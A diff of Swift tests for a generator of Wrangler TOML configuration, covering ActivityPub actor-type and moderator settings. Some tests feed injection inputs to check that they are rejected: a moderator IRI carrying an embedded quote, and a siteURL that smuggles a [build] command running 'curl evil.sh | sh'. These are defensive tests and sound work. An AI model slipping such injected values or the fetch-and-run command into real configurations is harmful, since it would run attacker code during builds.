@@ -448,6 +448,56 @@ struct WorkerCompositionTests {
         #expect(!toml.contains("SITE_URL"))
     }
 
+    @Test("activitypub with actorType Group emits AP_ACTOR_TYPE")
+    func activitypubGroupEmitsActorTypeVar() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group"
+        )
+        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
+    }
+
+    @Test("activitypub with no actorType (or a non-Group value) omits AP_ACTOR_TYPE")
+    func activitypubWithoutGroupOmitsActorTypeVar() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        #expect(!toml.contains("AP_ACTOR_TYPE"))
+        let tomlPerson = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Person")
+        #expect(!tomlPerson.contains("AP_ACTOR_TYPE"))
+    }
+
+    @Test("Group actor with moderators emits a comma-joined AP_MODERATORS var")
+    func groupActorEmitsModeratorsVar() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
+            moderators: ["https://mod1.example/actor", "https://mod2.example/actor"]
+        )
+        #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor,https://mod2.example/actor\""))
+    }
+
+    @Test("moderators are ignored when actorType isn't Group")
+    func moderatorsIgnoredWithoutGroupActorType() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], moderators: ["https://mod1.example/actor"]
+        )
+        #expect(!toml.contains("AP_MODERATORS"))
+        #expect(!toml.contains("AP_ACTOR_TYPE"))
+    }
+
+    @Test("empty or unsafe moderator IRIs are filtered out, leaving AP_ACTOR_TYPE alone")
+    func unsafeModeratorIRIsAreFiltered() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
+            moderators: ["", "https://evil.example/\"injected"]
+        )
+        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
+        #expect(!toml.contains("AP_MODERATORS"))
+    }
+
     @Test("a siteURL containing a double quote is rejected, not interpolated raw into TOML")
     func rejectsSiteURLWithEmbeddedQuote() throws {
         let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
